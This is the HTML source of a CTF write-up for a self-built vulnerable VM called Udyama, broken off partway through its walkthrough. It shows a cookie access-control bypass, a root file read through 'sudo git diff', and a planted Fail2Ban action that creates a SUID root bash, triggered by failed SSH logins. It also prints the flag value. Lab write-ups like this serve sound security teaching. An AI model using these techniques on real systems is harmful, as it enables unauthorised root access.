@@ -1,0 +1,1143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Udyama (उद्यम) — CTF Writeup by Jishnu</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;1,400&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #050508;
+  --surf:   #0a0a10;
+  --surf2:  #0f0f18;
+  --border: #1a1a28;
+  --green:  #00ff41;
+  --green2: #00c832;
+  --cyan:   #00d4ff;
+  --yellow: #ffd700;
+  --red:    #ff3366;
+  --orange: #ff8c00;
+  --dim:    #4a4a6a;
+  --sub:    #8888aa;
+  --fg:     #c8c8e8;
+  --white:  #e8e8ff;
+  --mono:   'IBM Plex Mono', monospace;
+  --title:  'Orbitron', monospace;
+  --code:   'Share Tech Mono', monospace;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; }
+
+body {
+  background:var(--bg);
+  color:var(--fg);
+  font-family:var(--mono);
+  overflow-x:hidden;
+}
+
+/* Scanline effect */
+body::before {
+  content:'';
+  position:fixed; inset:0; z-index:0; pointer-events:none;
+  background:repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,255,65,0.012) 2px,
+    rgba(0,255,65,0.012) 4px
+  );
+}
+
+/* Matrix rain canvas */
+#matrix-canvas {
+  position:fixed; top:0; left:0; z-index:0;
+  opacity:0.07; pointer-events:none;
+}
+
+/* ─── SCROLL ANIMATION STAGE ─── */
+#scroll-stage {
+  position:fixed; top:0; right:40px; z-index:50;
+  width:120px; height:100vh;
+  pointer-events:none;
+  overflow:hidden;
+}
+
+/* Player character */
+#player {
+  position:absolute;
+  left:50%; transform:translateX(-50%);
+  font-size:28px;
+  transition:top 0.1s linear;
+  filter:drop-shadow(0 0 8px var(--green));
+  top:60px;
+}
+
+/* Track line */
+#track {
+  position:absolute;
+  left:50%; transform:translateX(-50%);
+  width:2px; top:90px; bottom:40px;
+  background:linear-gradient(to bottom, var(--green), var(--cyan), var(--yellow));
+  opacity:0.3;
+}
+
+/* Flags on track */
+.track-flag {
+  position:absolute;
+  left:50%; transform:translateX(-20px);
+  font-size:24px;
+  filter:drop-shadow(0 0 10px var(--yellow));
+  transition:transform 0.3s, filter 0.3s;
+}
+.track-flag.captured {
+  filter:drop-shadow(0 0 16px var(--green)) brightness(1.5);
+  animation:flagCapture 0.5s ease forwards;
+}
+@keyframes flagCapture {
+  0%  { transform:translateX(-20px) scale(1); }
+  50% { transform:translateX(-20px) scale(1.6) rotate(15deg); }
+  100%{ transform:translateX(-20px) scale(0.8) rotate(0deg); }
+}
+
+/* Capture burst */
+.capture-burst {
+  position:absolute; left:50%; transform:translateX(-50%);
+  width:60px; height:60px;
+  border-radius:50%;
+  background:radial-gradient(circle, var(--green), transparent);
+  animation:burst 0.6s ease-out forwards;
+  opacity:0;
+}
+@keyframes burst {
+  0%  { opacity:1; transform:translateX(-50%) scale(0); }
+  50% { opacity:0.8; transform:translateX(-50%) scale(1.5); }
+  100%{ opacity:0; transform:translateX(-50%) scale(2.5); }
+}
+
+/* ─── NAV ─── */
+nav {
+  position:fixed; top:0; left:0; right:0; z-index:100;
+  padding:14px 60px;
+  background:rgba(5,5,8,0.92); backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(0,255,65,0.12);
+  display:flex; align-items:center; justify-content:space-between;
+}
+.nav-brand {
+  font-family:var(--title); font-size:13px; color:var(--green);
+  letter-spacing:.2em;
+}
+.nav-links { display:flex; gap:28px; }
+.nav-links a {
+  font-family:var(--code); font-size:11px; color:var(--dim);
+  text-decoration:none; letter-spacing:.15em; text-transform:uppercase;
+  transition:color .2s;
+}
+.nav-links a:hover { color:var(--green); }
+.nav-status {
+  font-family:var(--code); font-size:11px; color:var(--green);
+  display:flex; align-items:center; gap:8px;
+}
+.status-dot {
+  width:7px; height:7px; border-radius:50%;
+  background:var(--green);
+  animation:statusPulse 2s infinite;
+}
+@keyframes statusPulse {
+  0%,100% { box-shadow:0 0 0 0 rgba(0,255,65,0.7); }
+  50% { box-shadow:0 0 0 6px rgba(0,255,65,0); }
+}
+
+/* ─── HERO ─── */
+.hero {
+  min-height:100vh; padding:120px 60px 80px;
+  display:flex; flex-direction:column; justify-content:center;
+  position:relative; overflow:hidden;
+}
+
+.hero-glow {
+  position:absolute; top:10%; left:10%;
+  width:500px; height:500px; border-radius:50%;
+  background:radial-gradient(circle, rgba(0,255,65,0.06) 0%, transparent 70%);
+  pointer-events:none;
+}
+
+.hero-sanskrit {
+  font-family:var(--title); font-size:clamp(60px,10vw,140px);
+  color:transparent;
+  -webkit-text-stroke:1px rgba(0,255,65,0.3);
+  position:absolute; top:50%; left:50%;
+  transform:translate(-50%,-50%);
+  white-space:nowrap; pointer-events:none; user-select:none;
+  letter-spacing:.1em;
+}
+
+.hero-tag {
+  font-family:var(--code); font-size:11px; color:var(--green);
+  letter-spacing:.25em; text-transform:uppercase; margin-bottom:20px;
+  display:flex; align-items:center; gap:12px;
+  opacity:0; animation:fadeUp .5s .1s forwards;
+}
+.hero-tag::before { content:''; width:40px; height:1px; background:var(--green); }
+
+.hero-title {
+  font-family:var(--title);
+  font-size:clamp(48px,7vw,100px);
+  font-weight:900; line-height:.95; letter-spacing:-.02em;
+  margin-bottom:12px;
+  opacity:0; animation:fadeUp .6s .2s forwards;
+}
+.hero-title .g { color:var(--green); }
+.hero-title .d { color:var(--dim); }
+
+.hero-sub-title {
+  font-family:var(--mono); font-size:clamp(16px,2vw,24px);
+  color:var(--sub); margin-bottom:40px;
+  opacity:0; animation:fadeUp .6s .3s forwards;
+}
+
+.hero-meta {
+  display:grid; grid-template-columns:repeat(3,auto); gap:32px;
+  width:fit-content; margin-bottom:48px;
+  opacity:0; animation:fadeUp .6s .4s forwards;
+}
+.meta-box {
+  background:rgba(0,255,65,0.04); border:1px solid rgba(0,255,65,0.15);
+  border-radius:8px; padding:16px 24px;
+}
+.meta-key { font-family:var(--code); font-size:9px; color:var(--dim); letter-spacing:.2em; text-transform:uppercase; margin-bottom:6px; }
+.meta-val { font-family:var(--code); font-size:14px; color:var(--green); font-weight:500; }
+
+.hero-quote {
+  font-family:var(--mono); font-size:14px; color:var(--dim);
+  font-style:italic; max-width:480px; line-height:1.8;
+  border-left:2px solid var(--green); padding-left:16px;
+  opacity:0; animation:fadeUp .6s .5s forwards;
+}
+
+.scroll-hint {
+  position:absolute; bottom:40px; left:60px;
+  font-family:var(--code); font-size:10px; color:var(--dim);
+  letter-spacing:.2em; text-transform:uppercase;
+  display:flex; align-items:center; gap:12px;
+  animation:fadeIn 1s 1.5s forwards; opacity:0;
+}
+.scroll-hint::after {
+  content:''; width:1px; height:40px;
+  background:linear-gradient(to bottom, var(--green), transparent);
+  animation:scrollLine 2s infinite;
+}
+@keyframes scrollLine {
+  0%,100% { opacity:1; transform:scaleY(1); }
+  50% { opacity:0.3; transform:scaleY(0.5); }
+}
+
+/* ─── SECTIONS ─── */
+section {
+  padding:100px 60px; position:relative; z-index:1;
+  max-width:1000px; margin:0 auto;
+}
+
+.sec-num {
+  font-family:var(--code); font-size:10px; color:var(--green);
+  letter-spacing:.2em; text-transform:uppercase; margin-bottom:12px;
+  display:flex; align-items:center; gap:10px;
+}
+.sec-num::before { content:''; width:24px; height:1px; background:var(--green); }
+
+.sec-h2 {
+  font-family:var(--title); font-size:clamp(28px,3vw,44px);
+  font-weight:900; letter-spacing:-.02em; line-height:1.1; margin-bottom:40px;
+  color:var(--white);
+}
+.sec-h2 em { font-style:normal; color:var(--green); }
+
+/* ─── INFO BOX ─── */
+.info-grid {
+  display:grid; grid-template-columns:1fr 1fr; gap:2px;
+  background:var(--border); border-radius:12px; overflow:hidden;
+  border:1px solid var(--border); margin-bottom:40px;
+}
+.info-cell {
+  background:var(--surf); padding:32px;
+  transition:background .3s;
+}
+.info-cell:hover { background:var(--surf2); }
+.info-cell h3 {
+  font-family:var(--code); font-size:10px; color:var(--green);
+  letter-spacing:.15em; text-transform:uppercase; margin-bottom:12px;
+}
+.info-cell p {
+  font-family:var(--mono); font-size:13px; color:var(--fg); line-height:1.85;
+}
+.info-cell p strong { color:var(--green); }
+
+/* ─── STEPS ─── */
+.step-list { display:flex; flex-direction:column; gap:2px; }
+
+.step-card {
+  background:var(--surf); border:1px solid var(--border);
+  border-radius:0; padding:0;
+  transition:all .3s; overflow:hidden;
+}
+.step-card:first-child { border-radius:12px 12px 0 0; }
+.step-card:last-child { border-radius:0 0 12px 12px; }
+
+.step-header {
+  padding:24px 32px; display:flex; align-items:center; gap:20px;
+  cursor:pointer; user-select:none;
+  transition:background .2s;
+}
+.step-header:hover { background:rgba(0,255,65,0.04); }
+
+.step-n {
+  font-family:var(--title); font-size:28px; font-weight:900;
+  color:rgba(0,255,65,0.15); min-width:48px; line-height:1;
+}
+.step-title-wrap { flex:1; }
+.step-title {
+  font-family:var(--title); font-size:16px; font-weight:700;
+  color:var(--white); letter-spacing:.02em; margin-bottom:4px;
+}
+.step-subtitle {
+  font-family:var(--code); font-size:10px; color:var(--dim);
+  letter-spacing:.12em; text-transform:uppercase;
+}
+.step-badge {
+  font-family:var(--code); font-size:10px; padding:4px 12px;
+  border-radius:99px; border:1px solid;
+}
+.step-badge.recon  { border-color:rgba(0,212,255,.4); color:var(--cyan); }
+.step-badge.web    { border-color:rgba(255,140,0,.4); color:var(--orange); }
+.step-badge.access { border-color:rgba(0,255,65,.4); color:var(--green); }
+.step-badge.privesc{ border-color:rgba(255,215,0,.4); color:var(--yellow); }
+.step-badge.root   { border-color:rgba(255,51,102,.4); color:var(--red); }
+
+.step-body {
+  padding:0 32px 32px 32px;
+  display:none;
+}
+.step-body.open { display:block; }
+
+.step-desc {
+  font-family:var(--mono); font-size:13px; color:var(--fg);
+  line-height:1.85; margin-bottom:20px;
+}
+.step-desc strong { color:var(--green); }
+
+/* ─── CODE BLOCKS ─── */
+.code-wrap {
+  background:#02020a; border:1px solid rgba(0,255,65,0.15);
+  border-radius:8px; overflow:hidden; margin:16px 0;
+}
+.code-bar {
+  background:rgba(0,255,65,0.06); padding:8px 16px;
+  display:flex; align-items:center; gap:10px;
+  border-bottom:1px solid rgba(0,255,65,0.1);
+}
+.code-dot { width:8px; height:8px; border-radius:50%; }
+.code-dot.r { background:#ff5f57; }
+.code-dot.y { background:#ffbd2e; }
+.code-dot.g { background:#28c940; }
+.code-label { font-family:var(--code); font-size:10px; color:var(--dim); margin-left:4px; }
+pre {
+  padding:20px; font-family:var(--code); font-size:12px;
+  color:var(--fg); line-height:1.8; overflow-x:auto;
+  white-space:pre;
+}
+.cmd { color:var(--cyan); }
+.out { color:var(--sub); }
+.flag-text { color:var(--yellow); font-weight:700; }
+.comment { color:var(--dim); }
+.hl { color:var(--green); }
+.warn { color:var(--orange); }
+
+/* ─── FLAG CAPTURE CARD ─── */
+.flag-card {
+  background:linear-gradient(135deg, rgba(0,255,65,0.06), rgba(0,255,65,0.02));
+  border:1px solid rgba(0,255,65,0.3);
+  border-radius:12px; padding:28px 32px;
+  display:flex; align-items:center; gap:24px;
+  margin:24px 0;
+  position:relative; overflow:hidden;
+}
+.flag-card::before {
+  content:'';
+  position:absolute; inset:0;
+  background:linear-gradient(90deg, transparent, rgba(0,255,65,0.03), transparent);
+  animation:shimmer 3s infinite;
+}
+@keyframes shimmer {
+  0% { transform:translateX(-100%); }
+  100% { transform:translateX(100%); }
+}
+.flag-icon { font-size:36px; filter:drop-shadow(0 0 12px var(--yellow)); }
+.flag-label { font-family:var(--code); font-size:10px; color:var(--green); letter-spacing:.15em; text-transform:uppercase; margin-bottom:6px; }
+.flag-value { font-family:var(--code); font-size:16px; color:var(--yellow); font-weight:700; letter-spacing:.05em; }
+
+/* ─── SUMMARY TABLE ─── */
+.summary-table {
+  width:100%; border-collapse:collapse;
+  background:var(--surf); border:1px solid var(--border);
+  border-radius:12px; overflow:hidden;
+}
+.summary-table th {
+  background:rgba(0,255,65,0.08); padding:14px 20px;
+  font-family:var(--code); font-size:10px; color:var(--green);
+  letter-spacing:.15em; text-transform:uppercase; text-align:left;
+  border-bottom:1px solid var(--border);
+}
+.summary-table td {
+  padding:14px 20px; font-family:var(--code); font-size:12px;
+  color:var(--fg); border-bottom:1px solid rgba(255,255,255,0.04);
+  vertical-align:top; line-height:1.6;
+}
+.summary-table tr:last-child td { border-bottom:none; }
+.summary-table tr:hover td { background:rgba(0,255,65,0.03); }
+.td-n { color:var(--dim); }
+.td-method { color:var(--cyan); }
+
+/* ─── LESSONS ─── */
+.lesson-list { display:flex; flex-direction:column; gap:16px; }
+.lesson-card {
+  background:var(--surf); border:1px solid var(--border);
+  border-radius:10px; padding:24px 28px;
+  display:flex; gap:20px; align-items:start;
+  transition:all .3s;
+}
+.lesson-card:hover { border-color:rgba(0,255,65,0.2); background:var(--surf2); }
+.lesson-num {
+  font-family:var(--title); font-size:32px; font-weight:900;
+  color:rgba(0,255,65,0.1); min-width:40px; line-height:1;
+}
+.lesson-body h4 {
+  font-family:var(--title); font-size:14px; font-weight:700;
+  color:var(--white); margin-bottom:8px; letter-spacing:.02em;
+}
+.lesson-body p {
+  font-family:var(--mono); font-size:12px; color:var(--sub); line-height:1.8;
+}
+
+/* ─── SKILLS ─── */
+.skills-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:14px; }
+.skill-tag {
+  background:var(--surf); border:1px solid var(--border);
+  border-radius:8px; padding:16px 20px;
+  font-family:var(--code); font-size:12px; color:var(--fg);
+  display:flex; align-items:center; gap:10px;
+  transition:all .3s;
+}
+.skill-tag:hover { border-color:rgba(0,255,65,0.3); color:var(--green); }
+.skill-dot { width:6px; height:6px; border-radius:50%; background:var(--green); flex-shrink:0; }
+
+/* ─── DIVIDER ─── */
+.divider {
+  height:1px;
+  background:linear-gradient(90deg,transparent,rgba(0,255,65,0.2),transparent);
+  margin:0 60px;
+}
+
+/* ─── FOOTER ─── */
+footer {
+  padding:60px; border-top:1px solid var(--border);
+  text-align:center; position:relative; z-index:1;
+}
+.footer-sanskrit {
+  font-family:var(--title); font-size:13px; color:var(--green);
+  letter-spacing:.15em; margin-bottom:8px;
+}
+.footer-translation {
+  font-family:var(--mono); font-size:12px; color:var(--dim);
+  font-style:italic; margin-bottom:20px;
+}
+.footer-meta { font-family:var(--code); font-size:11px; color:var(--dim); }
+
+/* ─── REVEAL ─── */
+.reveal { opacity:0; transform:translateY(24px); transition:opacity .6s ease, transform .6s ease; }
+.reveal.vis { opacity:1; transform:translateY(0); }
+
+/* ─── KEYFRAMES ─── */
+@keyframes fadeUp { from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)} }
+@keyframes fadeIn { from{opacity:0}to{opacity:1} }
+@keyframes glitch {
+  0%,100% { text-shadow:2px 0 var(--green),-2px 0 var(--cyan); }
+  25% { text-shadow:-2px 0 var(--red),2px 0 var(--green); transform:skew(-1deg); }
+  75% { text-shadow:2px 0 var(--cyan),-2px 0 var(--red); transform:skew(1deg); }
+}
+.glitch { animation:glitch 4s infinite; }
+
+/* ─── RESPONSIVE ─── */
+@media(max-width:900px) {
+  nav { padding:14px 24px; }
+  .nav-links { display:none; }
+  section { padding:70px 24px; }
+  .hero { padding:100px 24px 70px; }
+  .info-grid { grid-template-columns:1fr; }
+  .skills-grid { grid-template-columns:1fr 1fr; }
+  .hero-meta { grid-template-columns:1fr 1fr; }
+  footer { padding:40px 24px; }
+  .divider { margin:0 24px; }
+  #scroll-stage { right:10px; width:60px; }
+  #player { font-size:18px; }
+  .track-flag { font-size:16px; }
+}
+@media(max-width:500px) {
+  .hero-meta { grid-template-columns:1fr; }
+  .skills-grid { grid-template-columns:1fr; }
+  .step-header { padding:18px 20px; }
+  .step-body { padding:0 20px 24px; }
+  #scroll-stage { display:none; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="matrix-canvas"></canvas>
+
+<!-- ─── SCROLL STAGE ─── -->
+<div id="scroll-stage">
+  <div id="track"></div>
+  <div class="track-flag" id="flag1" style="top:38%">🚩</div>
+  <div class="track-flag" id="flag2" style="top:72%">🏁</div>
+  <div id="player">🧑‍💻</div>
+</div>
+
+<!-- ─── NAV ─── -->
+<nav>
+  <div class="nav-brand">UDYAMA · CTF</div>
+  <div class="nav-links">
+    <a href="#overview">Overview</a>
+    <a href="#walkthrough">Walkthrough</a>
+    <a href="#flags">Flags</a>
+    <a href="#lessons">Lessons</a>
+  </div>
+  <div class="nav-status">
+    <div class="status-dot"></div>
+    MACHINE ACTIVE
+  </div>
+</nav>
+
+<!-- ─── HERO ─── -->
+<div class="hero" id="top">
+  <div class="hero-glow"></div>
+  <div class="hero-sanskrit">उद्यम</div>
+
+  <div class="hero-tag">CTF Writeup · February 2026 · by Jishnu</div>
+  <h1 class="hero-title">
+    <span class="g glitch">UDYAMA</span><br>
+    <span class="d">उद्यम</span>
+  </h1>
+  <p class="hero-sub-title">Persistence · Privilege Escalation · Root</p>
+
+  <div class="hero-meta">
+    <div class="meta-box">
+      <div class="meta-key">Difficulty</div>
+      <div class="meta-val">Intermediate → Advanced</div>
+    </div>
+    <div class="meta-box">
+      <div class="meta-key">Flags</div>
+      <div class="meta-val">2 (User + Root)</div>
+    </div>
+    <div class="meta-box">
+      <div class="meta-key">Platform</div>
+      <div class="meta-val">Ubuntu · VirtualBox OVA</div>
+    </div>
+    <div class="meta-box">
+      <div class="meta-key">Category</div>
+      <div class="meta-val">Linux PrivEsc</div>
+    </div>
+    <div class="meta-box">
+      <div class="meta-key">Release</div>
+      <div class="meta-val">February 2026</div>
+    </div>
+    <div class="meta-box">
+      <div class="meta-key">Download</div>
+      <div class="meta-val" style="font-size:11px">archive.org/details/Udyama</div>
+    </div>
+  </div>
+
+  <p class="hero-quote">
+    "उद्यमेन हि सिध्यन्ति कार्याणि न मनोरथैः।"<br>
+    <span style="color:var(--fg)">"Tasks are accomplished through effort, not mere wishes."</span>
+  </p>
+
+  <div class="scroll-hint">Scroll to begin</div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─── OVERVIEW ─── -->
+<section id="overview">
+  <div class="sec-num">01 — Overview</div>
+  <h2 class="sec-h2 reveal">About <em>Udyama</em></h2>
+
+  <div class="info-grid reveal">
+    <div class="info-cell">
+      <h3>The Name</h3>
+      <p><strong>Udyama (उद्यम)</strong> is a Sanskrit word meaning <em>effort</em>, <em>enterprise</em>, and <em>determination</em>. The name is the hint — success on this machine requires persistence. You will be locked out. You will be banned. You will have to try again. That is by design.</p>
+    </div>
+    <div class="info-cell">
+      <h3>Why I Created It</h3>
+      <p>I wanted to build a CTF that feels like a <strong>real system under attack</strong>. Not a puzzle with a hidden file. A machine with Fail2Ban active, deliberate misconfigs, and escalation paths that reward careful enumeration over brute force.</p>
+    </div>
+    <div class="info-cell">
+      <h3>What Makes It Unique</h3>
+      <p>The <strong>Fail2Ban ban mechanic</strong> is central to the challenge. Being banned is not an obstacle to work around — it is the trigger that executes the malicious payload as root. Understanding that flips the entire challenge.</p>
+    </div>
+    <div class="info-cell">
+      <h3>Creation Process</h3>
+      <p>Built on Ubuntu Linux, exported as a VirtualBox OVA. Added <strong>deliberate misconfigurations</strong>, configured Fail2Ban with a malicious action file, sanitized logs and shell histories, placed flags, tested balance between difficulty and solvability.</p>
+    </div>
+  </div>
+
+  <div class="skills-grid reveal">
+    <div class="skill-tag"><div class="skill-dot"></div>Linux Administration</div>
+    <div class="skill-tag"><div class="skill-dot"></div>Privilege Escalation</div>
+    <div class="skill-tag"><div class="skill-dot"></div>Persistence & Access</div>
+    <div class="skill-tag"><div class="skill-dot"></div>Incident Response</div>
+    <div class="skill-tag"><div class="skill-dot"></div>VM Packaging</div>
+    <div class="skill-tag"><div class="skill-dot"></div>Fail2Ban Abuse</div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ─── WALKTHROUGH ─── -->
+<section id="walkthrough">
+  <div class="sec-num">02 — Walkthrough</div>
+  <h2 class="sec-h2 reveal">Full Exploitation Path</h2>
+
+  <div class="code-wrap reveal" style="margin-bottom:40px">
+    <div class="code-bar">
+      <div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div>
+      <span class="code-label">exploitation-summary.txt</span>
+    </div>
+    <pre><span class="comment">  Exploitation Path Summary
+  ─────────────────────────────────────────────────────────────────</span>
+
+  <span class="hl">1.</span> Discover hidden web page    →  http://target/hidden/secret.html
+  <span class="hl">2.</span> Cookie manipulation (0→1)   →  Unlock SSH credentials
+  <span class="hl">3.</span> SSH initial access           →  ssh ctfplayer@UbuntuCTF
+  <span class="hl">4.</span> sudo git diff leak           →  Read /root/flag.txt  ★ FLAG 1
+  <span class="hl">5.</span> Inspect Fail2Ban action      →  Discover malicious payload
+  <span class="hl">6.</span> Trigger Fail2Ban ban         →  Execute payload as root
+  <span class="hl">7.</span> Wait for ban expiry          →  Patience is the key
+  <span class="hl">8.</span> /tmp/rootbash -p             →  Root shell  ★ FLAG 2</pre>
+  </div>
+
+  <div class="step-list reveal">
+
+    <!-- STEP 1 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">01</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Reconnaissance — Hidden Page Discovery</div>
+          <div class="step-subtitle">Web Enumeration</div>
+        </div>
+        <span class="step-badge recon">RECON</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body open">
+        <p class="step-desc">Begin with standard web enumeration. A hidden page is accessible without any fuzzing tool — but directory brute-forcing confirms it exists. Navigate to:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">browser</span></div>
+          <pre><span class="cmd">http://target/hidden/secret.html</span></pre>
+        </div>
+        <p class="step-desc">The page contains a clue left by the machine's administrator — hinting that:</p>
+        <p class="step-desc">→ <strong>Fail2Ban is active</strong> and watching SSH login attempts.<br>
+        → A <strong>custom action configuration</strong> has been installed.<br>
+        → Something unusual has been added to the action definitions.</p>
+        <p class="step-desc">Take note of this. It tells you exactly where to look once you have a low-privileged shell. Next — inspect the browser cookies.</p>
+      </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">02</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Cookie Manipulation — Unlock SSH Credentials</div>
+          <div class="step-subtitle">Client-Side Access Control Bypass</div>
+        </div>
+        <span class="step-badge web">WEB</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Open Developer Tools on the hidden page. You will find a cookie controlling access to restricted content:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">browser cookie</span></div>
+          <pre><span class="comment"># Original cookie</span>
+Cookie:  <span class="warn">admin=0</span>
+
+<span class="comment"># Change to:</span>
+Cookie:  <span class="hl">admin=1</span></pre>
+        </div>
+        <p class="step-desc">Three ways to do this:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">options</span></div>
+          <pre><span class="comment"># Option A — Browser DevTools</span>
+F12 → Application → Cookies → double-click value → change 0 to 1 → refresh
+
+<span class="comment"># Option B — Burp Suite</span>
+Intercept GET request → modify Cookie header → forward
+
+<span class="comment"># Option C — curl</span>
+<span class="cmd">curl -s --cookie "admin=1" http://target/hidden/secret.html</span></pre>
+        </div>
+        <p class="step-desc">The page now reveals SSH credentials. <strong>Never trust client-side access controls.</strong></p>
+      </div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">03</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Initial Access — SSH Login</div>
+          <div class="step-subtitle">Low-Privilege Shell</div>
+        </div>
+        <span class="step-badge access">ACCESS</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Using the credentials revealed by the cookie manipulation:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">terminal</span></div>
+          <pre><span class="cmd">ssh ctfplayer@UbuntuCTF</span>
+
+<span class="comment"># Verify access</span>
+<span class="cmd">$ whoami</span>
+<span class="out">ctfplayer</span>
+
+<span class="cmd">$ id</span>
+<span class="out">uid=1001(ctfplayer) gid=1001(ctfplayer) groups=1001(ctfplayer)</span></pre>
+        </div>
+        <p class="step-desc">You now have a low-privileged shell. Next: enumerate sudo privileges.</p>
+      </div>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">04</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Flag 1 — Git Diff File Leak</div>
+          <div class="step-subtitle">Sudo Misconfiguration Abuse</div>
+        </div>
+        <span class="step-badge privesc">PRIVESC</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Enumerate sudo privileges immediately after login:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">terminal</span></div>
+          <pre><span class="cmd">$ sudo -l</span>
+<span class="out">User ctfplayer may run the following commands:
+    (root) NOPASSWD: /usr/bin/git diff</span></pre>
+        </div>
+        <p class="step-desc"><strong>sudo git diff is extremely dangerous.</strong> When passed <code>/dev/null</code> as one argument and a protected file as the other, it prints the entire contents of that file as root.</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">exploit</span></div>
+          <pre><span class="cmd">sudo git diff /dev/null /root/flag.txt</span>
+
+<span class="out">diff --git a/dev/null b/root/flag.txt
+index 0000000..e69de29
+--- /dev/null
++++ b/root/flag.txt
+@@ -0,0 +1 @@</span>
+<span class="flag-text">+FLAG{search_whatis_fail2ban}</span></pre>
+        </div>
+
+        <div class="flag-card">
+          <span class="flag-icon">🚩</span>
+          <div>
+            <div class="flag-label">Flag 1 — User Flag Captured</div>
+            <div class="flag-value">FLAG{search_whatis_fail2ban}</div>
+          </div>
+        </div>
+
+        <p class="step-desc">The flag name is a nudge — research what Fail2Ban is and how its action files work. The next step exploits exactly that.</p>
+      </div>
+    </div>
+
+    <!-- STEP 5 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">05</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Enumeration — Inspect the Malicious Fail2Ban Action</div>
+          <div class="step-subtitle">Discovery of Root Payload</div>
+        </div>
+        <span class="step-badge privesc">PRIVESC</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Fail2Ban action files live in <code>/etc/fail2ban/action.d/</code>. A custom action file has been installed: <strong>custom.conf</strong>. Use the same sudo git diff trick:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">inspect</span></div>
+          <pre><span class="cmd">sudo git diff /etc/fail2ban/action.d/custom.conf</span>
+
+<span class="out">+[Definition]
++actionstart =
++actionstop  =
++actioncheck =</span>
+<span class="flag-text">+actionban   = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash</span>
+<span class="out">+actionunban =</span></pre>
+        </div>
+        <p class="step-desc"><strong>Analysis:</strong> The <code>actionban</code> directive runs as ROOT whenever Fail2Ban bans an IP address. The malicious payload:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">payload</span></div>
+          <pre><span class="warn">cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash</span>
+
+<span class="comment"># This command:
+# 1. Copies /bin/bash to /tmp/rootbash
+# 2. Sets the SUID bit (4755) — runs as owner (root) for any user</span></pre>
+        </div>
+        <p class="step-desc">Once this fires, any user can invoke <code>/tmp/rootbash -p</code> and receive a root shell. The trap is set. Now you need to trigger it.</p>
+      </div>
+    </div>
+
+    <!-- STEP 6 -->
+    <div class="step-card">
+      <div class="step-header" onclick="toggleStep(this)">
+        <div class="step-n">06</div>
+        <div class="step-title-wrap">
+          <div class="step-title">Trigger Fail2Ban — Execute the Malicious Payload</div>
+          <div class="step-subtitle">Deliberate SSH Failures</div>
+        </div>
+        <span class="step-badge privesc">PRIVESC</span>
+        <span style="color:var(--dim);font-size:18px;margin-left:8px">▾</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">Fail2Ban monitors SSH login failures. Deliberately fail logins to trigger the ban from your attacker machine:</p>
+        <div class="code-wrap">
+          <div class="code-bar"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div><span class="code-label">attacker machine</span></div>
+          <pre><span class="cmd">ssh wronguser@&lt;target-ip&gt;</span>  <span class="comment"># attempt 1 — wrong username</span>
+<span class="cmd">ssh wronguser@&lt;target-ip&gt;</span>  <span class="comment"># attempt 2</span>
+<span class="cmd">ssh wronguser@&lt;target-ip&gt;</span>  <span class="comment"># attempt 3</span>
+<span class="cmd">ssh wronguser@&lt;target-ip&gt;</span>  <span class="comment"># attempt 4</span>
